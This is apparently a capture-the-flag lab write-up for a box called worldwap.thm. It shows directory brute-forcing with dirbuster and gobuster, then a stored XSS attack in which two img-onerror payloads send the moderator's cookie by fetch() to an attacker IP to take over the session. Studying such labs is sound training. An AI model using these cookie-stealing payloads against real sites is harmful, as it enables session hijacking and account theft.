
## nmap scan
![](Pasted%20image%2020250208160826.png)

- 22 - ssh open
- 80 - cookie secure flag not set

Let s see what is on port 8081 
	![](Pasted%20image%2020250208161928.png)
	![](Pasted%20image%2020250208161957.png)

```shell
(root㉿kali)-[~]
└─# dirbuster -u http://worldwap.thm:8081 -l /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
File found: /index.php - 200
Feb 08, 2025 2:17:59 PM org.apache.commons.httpclient.HttpMethodBase processCookieHeaders
WARNING: Cookie rejected: "$Version=0; PHPSESSID=ltqln2ktcei1me78r6069f4ntl; $Path=/; $Domain=.worldwap.thm". Illegal domain attribute ".worldwap.thm". Domain of origin: "worldwap.thm"
Feb 08, 2025 2:17:59 PM org.apache.commons.httpclient.HttpMethodBase processCookieHeaders
WARNING: Cookie rejected: "$Version=0; PHPSESSID=rcs2an6hlmgm0ph5uim4lvlvt8; $Path=/; $Domain=.worldwap.thm". Illegal domain attribute ".worldwap.thm". Domain of origin: "worldwap.thm"
File found: /login.php - 200
Dir found: /icons/ - 403
File found: /profile.php - 302
File found: /clear.php - 200
Dir found: /assets/ - 200
File found: /chat.php - 302
Dir found: /icons/small/ - 403
File found: /db.php - 200
Dir found: /javascript/ - 403
File found: /logout.php - 302
File found: /setup.php - 200
File found: /block.php - 200
```

Nothing interesting found therefore we will get back at the main app hosted on port 80

## moderator account takeover
### **XSS (cookie steal)**
Let s try to create an account
	![](Pasted%20image%2020250208185950.png)
When we try to log in with the just created account we get the following message: ''user not verified" which means that our account was not validated by an authorithy(in our case an account moderator)
	![](Pasted%20image%2020250208190119.png)
We can try to register another account but this time to inject an XSS payload that will steal the moderator cookie once he will open our registration:

```javascript
<img src="nbyte" onerror="fetch('http://10.10.117.68:8000/?cookie='+document.cookie)">
```
OR
```javascript
<img src="nbyte2" onerror="fetch('http://10.10.117.68:8000/?secret='+encodeURIComponent(document.cookie))">
```

![](Pasted%20image%2020250208191234.png)

Now let s try to steal the moderator session using his cookies:
	![](Pasted%20image%2020250208191350.png)
		![](Pasted%20image%2020250208191459.png)












## administrator account takeover
### CSRF


### File upload / Priv.esc
Let s do another enum on the main app to see if we can find other interesting directories
```shell   
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://worldwap.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://worldwap.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2025/02/08 17:27:27 Starting gobuster in directory enumeration mode
===============================================================
/public               (Status: 301) [Size: 313] [--> http://worldwap.thm/public/]
/api                  (Status: 301) [Size: 310] [--> http://worldwap.thm/api/]
/javascript           (Status: 301) [Size: 317] [--> http://worldwap.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://worldwap.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
Progress: 219143 / 220561 (99.36%)===============================================================
2025/02/08 17:27:54 Finished
===============================================================
```

![](Pasted%20image%2020250208193017.png)
	